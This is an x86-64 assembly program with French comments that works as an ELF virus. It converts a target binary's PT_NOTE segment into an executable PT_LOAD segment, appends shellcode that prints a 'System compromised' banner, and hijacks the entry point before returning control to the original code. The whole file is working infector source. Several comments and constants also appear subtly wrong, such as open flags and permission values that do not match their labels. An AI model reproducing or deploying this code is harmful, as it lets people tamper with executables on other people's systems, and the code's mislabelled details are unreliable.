section .data
    ; Définition des messages et constantes utilisés dans le programme
    magic_bytes db 0x7F, "ELF"    ; Signature d'un fichier ELF    
    err_msg db "Ce n'est pas un fichier ELF valide", 10 ; Message d'erreur pour fichier non ELF
    err_len equ $ - err_msg
    dir_msg db "C'est un répertoire", 10 ; Message pour indiquer que c'est un répertoire
    dir_len equ $ - dir_msg
    elf_msg db "C'est un fichier ELF.", 10 ; Message pour indiquer que c'est un fichier ELF
    elf_len equ $ - elf_msg
    mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RWE", 10
    mod_len equ $ - mod_msg
    already_mod_msg db "Ce fichier a déjà été modifié", 10
    already_mod_len equ $ - already_mod_msg
    signature db "INFECTED", 0     ; Signature pour marquer les fichiers infectés    
    sig_len equ $ - signature

    ; Section contenant le shellcode qui sera injecté dans le fichier cible
    section .data.shellcode
    align 16                 ; Aligner le shellcode sur une limite de 16 octets
    shellcode:
        call get_base ; Appel pour obtenir l'adresse de base
    get_base:
        pop rbx                        ; Récupère l'adresse de retour de la pile dans rbx
        sub rbx, get_base - shellcode  ; Calcule l'adresse de base en soustrayant l'offset
        
        ; Sauvegarder les registres essentiels
        push rax 
        push rcx 
        push rdx
        push rsi
        push rdi
        
        ; Afficher le message
        mov rax, 1          ; sys_write
        mov rdi, 1          ; stdout
        lea rsi, [rbx + message - shellcode]  ; Charger l'adresse du message dans rsi
        mov rdx, msg_len                      ; Charger la longueur du message dans rdx
        syscall
        
        ; Restaurer les registres
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rax
        
        ; Calculer et sauter à l'adresse originale
        mov rax, [rbx + entry_storage - shellcode]  ; Charger l'adresse d'entrée originale
        mov rcx, [rbx + vaddr_storage - shellcode]  ; Charger l'adresse virtuelle du segment
        sub rbx, rcx                                ; Calculer le décalage entre l'adresse de base et l'adresse virtuelle
        add rax, rbx                                ; Ajouter le décalage à l'adresse d'entrée originale
        jmp rax                                     ; Sauter à l'adresse d'entrée originale

        ; Données
        message: db "[!] System compromised by H45H1F aka M364TR0N :)", 10
        msg_len equ $ - message
        
        ; Stockage des adresses
        entry_storage: dq 0
        vaddr_storage: dq 0

    shellcode_end:

    ; Offsets nécessaires
    entry_offset equ entry_storage - shellcode
    vaddr_offset equ vaddr_storage - shellcode
    shellcode_len equ shellcode_end - shellcode

section .bss
    fd resq 1                ; File descriptor pour le fichier cible
    filename resq 1          ; Pour stocker le nom du fichier
    elf_header resb 64       ; Buffer pour stocker l'en-tête ELF complet
    stat_buf resb 144        ; Buffer pour stocker les informations stat
    phdr resb 56            ; Structure pour stocker un program header
    original_entry_addr resq 1 ; Pour sauvegarder le point d'entrée original
    magic resb 4             ; Pour stocker et vérifier la signature ELF (0x7F 'ELF')
    phdr_offset resq 1       ; Offset de la table des program headers
    phdr_entry_size resw 1   ; Taille d'une entrée dans la table des program headers
    phdr_number resw 1       ; Nombre total de program headers
    current_offset resq 1     ; Offset actuel lors du parcours du fichier
    note_offset resq 1        ; Offset de la section NOTE si trouvée
    note_found resb 1         ; Flag indiquant si une section NOTE a été trouvée (1) ou non (0)

section .text
global _start

_start:
    ; Vérifie le nombre d'arguments
    mov rcx, [rsp]          ; Charge argc depuis la pile
    dec rcx                 ; Soustrait 1 pour ignorer le nom du programme
    test rcx, rcx           ; Vérifie si aucun argument
    jz not_elf              ; Si pas d'arguments, erreur
    
    ; Récupère le nom du fichier
    mov rdi, [rsp + 16]     ; Charge argv[1] directement depuis la pile
    
    push rdi                ; Sauvegarde le nom du fichier
    
    ; Appel système stat pour obtenir les informations du fichier
    mov rax, 4              ; sys_stat
    mov rsi, stat_buf       ; Adresse du buffer pour stocker les informations du fichier
    syscall
    test rax, rax           ; Vérifier si stat a réussi
    js exit                 ; Si erreur, sortir

    ; Vérifier si le fichier est un répertoire 
    mov rax, [stat_buf + 16] ; Charger le mode du fichier depuis le buffer stat
    cmp rax, 2              ; Comparer avec le mode répertoire
    je is_directory         ; Sauter si répertoire

    ; Ouvrir le fichier en lecture seule
    mov rax, 2              ; sys_open
    mov rsi, 2              ; O_RDONLY
    syscall
    
    ; Vérifie les erreurs d'ouverture
    test rax, rax           ; Vérifier si l'ouverture a réussi
    js not_elf              ; Si erreur, ce n'est pas un fichier ELF

    ; Stocke le descripteur de fichier
    mov [fd], rax           ; Stocker le descripteur de fichier dans fd

    ; Restaure la pile et continue le traitement
    add rsp, 144            ; Libère l'espace stat_buf

    call verify_elf
    call find_pt_note

check_if_modified:
    ; Vérifie s'il reste des segments à analyser
    mov rcx, r12            ; Utilise rcx comme compteur
    test rcx, rcx           ; Vérifie si le compteur est à zéro
    jz exit                 ; Si zéro, sortir

.check_loop:
    ; Lecture du segment
    push rcx                        ; Sauvegarde le compteur de boucle
    mov rax, 8                      ; Prépare l'appel système lseek
    mov rdi, [fd]                   ; Charge le descripteur de fichier
    mov rsi, [current_offset]       ; Charge l'offset actuel
    cdq                             ; Étend rdx en fonction du signe de rax
    syscall
    
    ; Lecture du program header
    mov rax, 0                      ; Prépare l'appel système read
    mov rsi, phdr                   ; Charge l'adresse du buffer pour le program header
    movzx rdx, word [phdr_entry_size] ; Charge la taille d'une entrée de program header
    syscall
    
    ; Vérifie si le type de segment est PT_NOTE
    cmp dword [phdr], 4             ; Compare le type de segment avec PT_NOTE
    je .found_modified              ; Si égal, segment PT_NOTE trouvé
    
    ; Passe au segment suivant
    pop rcx                         ; Restaure le compteur de boucle
    add [current_offset], rdx       ; Incrémente l'offset actuel par la taille de l'entrée
    loop .check_loop                ; Décrémente rcx et boucle si rcx n'est pas zéro
    
.found_modified:
    pop rcx                 ; Restaure la pile
    jmp file_already_modified ; Sauter à la routine de fichier déjà modifié

scan_headers:
    push rsi                    ; Sauvegarde le registre rsi
    xchg rax, rsi               ; Échange les valeurs de rax et rsi
    lea rsi, [elf_msg]          ; Charge l'adresse du message dans rsi
    mov dl, elf_len             ; Charge la longueur du message dans dl
    mov al, 1                   ; Prépare l'appel système write (syscall numéro 1)
    syscall
    jmp exit                    ; Sauter à la routine de sortie

find_pt_note:
    push rdx                    ; Sauvegarde le registre rdx
    xor edx, edx                ; Mettre edx à zéro
    mov dx, [phdr_number]       ; Charger le nombre de program headers dans dx
    mov r12, rdx                ; Stocker le nombre de program headers dans r12
    
    mov rax, [phdr_offset]      ; Charger l'offset de la table des program headers dans rax
    mov [current_offset], rax   ; Stocker l'offset actuel dans current_offset
    
    and byte [note_found], 0    ; Réinitialiser le flag note_found à 0
    pop rdx                     ; Restaure le registre rdx
    ret

modify_header:
    ; Lecture du header PT_NOTE
    push rbx                ; Sauvegarde le registre rbx
    mov eax, 8              ; Prépare l'appel système lseek
    mov rdi, [fd]           ; Charge le descripteur de fichier
    mov rsi, [note_offset]  ; Charge l'offset de la section NOTE
    cdq                     ; Étend rdx en fonction du signe de rax
    syscall
    
    ; Lecture du program header
    mov rdi, [fd]           ; Charge le descripteur de fichier
    xor eax, eax            ; Prépare l'appel système read
    lea rsi, [phdr]         ; Charge l'adresse du buffer pour le program header
    movzx rdx, word [phdr_entry_size] ; Charge la taille d'une entrée de program header
    syscall
    
    ; Calcul nouvelle position et alignement
    mov rdi, [fd]           ; Charge le descripteur de fichier
    mov eax, 8              ; Prépare l'appel système lseek
    xor esi, esi            ; Offset 0
    mov dl, 2               ; SEEK_END
    syscall
    
    mov r14, rax            ; Stocke la position actuelle dans r14
    add r14, 0xFFF          ; Ajoute 0xFFF pour l'alignement
    and r14, -0x1000        ; Aligne l'adresse sur une limite de page (4096 octets)
    
    ; Configuration nouveau segment
    mov dword [phdr], 1    ; PT_LOAD - Type de segment PT_LOAD
    mov dword [phdr+4], 5  ; RWX - Permissions du segment (lecture, écriture, exécution)
    mov [phdr+8], r14      ; Offset - Définir l'offset du segment à r14
    lea rax, [r14+0x400000] ; Calculer l'adresse virtuelle du segment
    mov [phdr+16], rax     ; vaddr - Définir l'adresse virtuelle du segment
    mov [phdr+24], rax     ; paddr - Définir l'adresse physique du segment
    mov eax, shellcode_len ; Charger la longueur du shellcode dans eax
    mov [phdr+32], rax     ; filesz - Définir la taille du segment dans le fichier
    mov [phdr+40], rax     ; memsz - Définir la taille du segment en mémoire
    mov qword [phdr+48], 0x1000 ; Alignement du segment à 4096 octets
    
    mov rax, [phdr+16]     ; Charger l'adresse virtuelle du segment dans rax
    mov [elf_header+24], rax ; Mettre à jour le point d'entrée dans l'en-tête ELF
    
    call write_modifications
    call write_code
    pop rbx                 ; Restaurer le registre rbx
    ret

write_modifications:
    ; Positionnement au début du fichier
    push rax                    ; Sauvegarde le registre rax
    push rdi                    ; Sauvegarde le registre rdi
    mov rax, 8                  ; Prépare l'appel système lseek
    mov rdi, [fd]               ; Charge le descripteur de fichier
    xor rsi, rsi                ; Offset 0 (début du fichier)
    xor rdx, rdx                ; SEEK_SET (début du fichier)
    syscall
    pop rdi                     ; Restaure le registre rdi
    pop rax                     ; Restaure le registre rax

    ; Écriture du header ELF
    push rcx                    ; Sauvegarde le registre rcx
    mov rax, 1                  ; Prépare l'appel système write
    mov rdi, [fd]               ; Charge le descripteur de fichier
    lea rsi, [elf_header]       ; Charge l'adresse du header ELF
    mov rdx, 64                 ; Taille du header ELF (64 octets)
    syscall
    pop rcx                     ; Restaure le registre rcx

    ; Positionnement à l'offset de la note
    push rbx                    ; Sauvegarde le registre rbx
    mov rax, 8                  ; Prépare l'appel système lseek
    mov rdi, [fd]               ; Charge le descripteur de fichier
    mov rsi, [note_offset]      ; Charge l'offset de la section NOTE
    xor rdx, rdx                ; SEEK_SET (début du fichier)
    syscall
    pop rbx                     ; Restaure le registre rbx

    ; Écriture du program header
    mov rax, 1                  ; Prépare l'appel système write
    mov rdi, [fd]               ; Charge le descripteur de fichier
    lea rsi, [phdr]             ; Charge l'adresse du program header
    mov rdx, 56                 ; Taille du program header (56 octets)
    syscall

    ret  ; Retour de la fonction

write_code:
    ; Sauvegarde des registres importants
    push rbx
    push rcx

    ; Mise à jour de l'adresse d'entrée dans le shellcode
    mov rax, [original_entry_addr]       ; Charge l'adresse d'entrée originale dans rax
    lea rdi, [shellcode + entry_offset]  ; Calcule l'adresse de stockage de l'entrée dans le shellcode
    mov [rdi], rax                       ; Stocke l'adresse d'entrée originale dans le shellcode

    ; Mise à jour de l'adresse virtuelle dans le shellcode
    mov rax, [phdr + 16]                 ; Charge l'adresse virtuelle du segment dans rax
    lea rdi, [shellcode + vaddr_offset]  ; Calcule l'adresse de stockage de l'adresse virtuelle dans le shellcode
    mov [rdi], rax                       ; Stocke l'adresse virtuelle dans le shellcode

    ; Positionnement dans le fichier
    push rax                             ; Sauvegarde le registre rax
    mov rax, 8                           ; Prépare l'appel système lseek
    mov rdi, [fd]                        ; Charge le descripteur de fichier
    mov rsi, r14                         ; Charge l'offset stocké dans r14
    xor rdx, rdx                         ; SEEK_SET (début du fichier)
    syscall
    pop rax                              ; Restaure le registre rax

    ; Écriture du shellcode
    mov rax, 1                           ; Prépare l'appel système write
    mov rdi, [fd]                        ; Charge le descripteur de fichier
    lea rsi, [shellcode]                 ; Charge l'adresse du shellcode
    mov rdx, shellcode_len               ; Charge la longueur du shellcode
    syscall

    ; Restauration des registres
    pop rcx
    pop rbx

    ret

verify_elf:
    push rbx                            ; Sauvegarde des registres
    sub rsp, 16                         ; Espace pour données temporaires
    
    ; Lecture des 4 premiers octets pour le magic number
    sub rsp, 4                          ; Espace pour le magic number
    mov rax, 0                          ; Prépare l'appel système read
    mov rdi, [fd]                       ; Charge le descripteur de fichier
    mov rsi, rsp                        ; Lire directement dans la stack
    mov rdx, 4                          ; Lire 4 octets
    syscall
    
    ; Vérification du magic number
    cmp dword [rsp], 0x464C457F         ; Comparer les 4 octets lus avec 0x464C457F (magic number ELF)
    jne not_elf                         ; Si différent, ce n'est pas un fichier ELF
    
    ; Affichage message ELF
    mov rax, 1                          ; Prépare l'appel système write
    mov rdi, 1                          ; stdout
    mov rsi, elf_msg                    ; Charger l'adresse du message ELF
    mov rdx, elf_len                    ; Charger la longueur du message ELF
    syscall
    
    ; Lecture du header complet
    mov rax, 8                          ; Prépare l'appel système lseek
    mov rdi, [fd]                       ; Charge le descripteur de fichier
    xor rsi, rsi                        ; Offset 0 (début du fichier)
    xor rdx, rdx                        ; SEEK_SET (début du fichier)
    syscall
    
    ; Lecture du header ELF complet
    mov rax, 0                          ; Prépare l'appel système read
    mov rdi, [fd]                       ; Charge le descripteur de fichier
    mov rsi, elf_header                 ; Charger l'adresse du buffer pour le header ELF
    mov rdx, 64                         ; Lire 64 octets (taille du header ELF)
    syscall
    
    ; Extraction des données du header
    mov rax, [elf_header + 24]          ; Charger le point d'entrée du fichier ELF
    mov [original_entry_addr], rax      ; Stocker le point d'entrée original
    
    mov rax, [elf_header + 32]          ; Charger l'offset de la table des program headers
    mov [phdr_offset], rax              ; Stocker l'offset de la table des program headers
    
    mov ax, word [elf_header + 54]      ; Charger la taille d'une entrée de program header
    mov [phdr_entry_size], ax           ; Stocker la taille d'une entrée de program header
    
    mov ax, word [elf_header + 56]      ; Charger le nombre de program headers
    mov [phdr_number], ax               ; Stocker le nombre de program headers
    
    add rsp, 20                         ; Restaure la stack
    pop rbx                             ; Restaure le registre rbx
    ret

file_already_modified:
    push rbx                        ; Sauvegarde registre
    
    ; Mise à jour des variables en utilisant un registre temporaire
    mov rbx, [current_offset]       ; Charge l'offset actuel dans rbx
    mov [note_offset], rbx          ; Stocke l'offset dans note_offset
    
    ; Marque le fichier comme déjà modifié
    mov byte [note_found], 1        ; Met à jour le flag note_found à 1
    
    call modify_header              ; Appelle la fonction pour modifier le header
    pop rbx                         ; Restaure le registre rbx
    jmp exit                        ; Sauter à la routine de sortie

is_directory:
    ; Informer que le chemin est un répertoire
    mov rax, 1                      ; sys_write
    mov rdi, 1                      ; stdout
    mov rsi, dir_msg                ; Charger l'adresse du message de répertoire
    mov rdx, dir_len                ; Charger la longueur du message de répertoire
    syscall
    jmp exit                        ; Sauter à la routine de sortie

not_elf:
    ; Informer que ce n'est pas un fichier ELF valide
    mov rax, 1              ; Prépare l'appel système write (écriture)
    mov rdi, 1              ; stdout (sortie standard)
    mov rsi, err_msg        ; Charger l'adresse du message d'erreur
    mov rdx, err_len        ; Charger la longueur du message d'erreur
    syscall
    jmp exit                ; Sauter à la routine de sortie

exit:
    ; Fermer le descripteur de fichier si ouvert
    mov rdi, [fd]           ; Charger le descripteur de fichier
    mov rax, 3              ; Prépare l'appel système close (fermeture)
    syscall
    
    ; Quitter le programme
    mov rax, 60             ; Prépare l'appel système exit (quitter)
    xor rdi, rdi            ; Code de retour 0
    syscall